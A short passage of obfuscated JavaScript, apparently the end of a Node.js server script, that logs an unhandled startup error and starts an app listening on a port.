_0x592163=_0x57736a;console[_0x592163(0x115)]('Unhandled\x20error\x20in\x20startserver:',_0x4b74af);}),app[_0x57736a(0xb6)](PORT,()=>console[_0x57736a(0xe5)](_0x57736a(0x10f)+PORT+'!'));
